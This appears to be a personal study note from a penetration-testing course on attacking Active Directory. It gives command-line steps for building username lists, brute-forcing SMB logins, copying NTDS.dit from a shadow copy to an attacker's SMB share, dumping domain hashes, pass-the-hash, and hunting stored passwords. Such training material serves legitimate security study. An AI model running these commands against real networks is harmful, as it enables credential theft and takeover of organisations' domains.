Attacking AD and NTDS.dit
############################

2024-11-22 10:55

Status:

Tags: 
:ref:`Certified Penetration Tester <Certified Penetration Tester>`
:ref:`Password Attacks <Password Attacks>`

Attacking AD and NTDS.dit
*********************************

Once a system has joined an AD domain, it will no longer reference the
SAM to validate logon requests

Creating usernames
************************************

Guessing the format of a username can be achieved, by various methods
suck as looking at the email format. If you have gleaned a list of
employees, you can use that list and an opensource tool username
anarchy https://github.com/urbanadventurer/username-anarchy  to
build a username list.

Example 1: Creating a username list

.. code-block:: console

   username-anarchy -i names.txt 

Brute forcing AD Accounts
**********************************

.. code-block:: console

   crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

Checking group perms when logged in
********************************************

Example: Looking for a member of domain admins or local admin

.. code-block:: console

   net localgroup
   net user <username>

Creating a shadow copy of C:
******************************

Example 1: using vssadmin

.. code-block:: console

   vssadmin CREATE SHADOW /For=C:

   ssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
   (C) Copyright 2001-2013 Microsoft Corp.

   Successfully created shadow copy for 'C:\'
       Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
       Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

Example 2: Copying the NTDS.dit from the VSS back tot the c: drive

.. code-block:: console

   cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

Example 3: Copy the NTDS.dit to your attack machines SMB share.

.. code-block:: console

   PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

A Faster method: Using cme to capture the NTDS.dit
******************************************************

Example: Using a user with admin privs

.. code-block:: console

    crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

The above will dump hashes that you can either crack with
:ref:`hashcat <hashcat>` or use the hash directly with
:ref:`crackmapexec` Authenticating with the hash
to authenticate (also know as pass-the-hash)

Credential Hunting in Windows
**********************************

1. Using Windows search to look for files with the % pass
2. Using :ref:`lazagne <lazagne>` to discover insecure Browser/Applications
   that store passwords insecurely

.. code-block:: console

   C:\Users\bob\Desktop> start lazagne.exe all

3. Using
   findstr <https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr

.. code-block:: console

   C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

4. Other places you may find passwords:

-  Passwords in Group Policy in the SYSVOL share
-  Passwords in scripts in the SYSVOL share
-  Password in scripts on IT shares
-  Passwords in web.config files on dev machines and IT shares
-  unattend.xml
-  Passwords in the AD user or computer description fields
-  KeePass databases –> pull hash, crack and get loads of access.
-  Found on user systems and shares
-  Files such as pass.txt, passwords.docx, passwords.xlsx found on user
   systems, shares, Sharepoint

References
************************
https://academy.hackthebox.com/module/147/section/1326
https://attack.mitre.org/techniques/T1003/003/
https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service
https://academy.hackthebox.com/module/147/section/1318
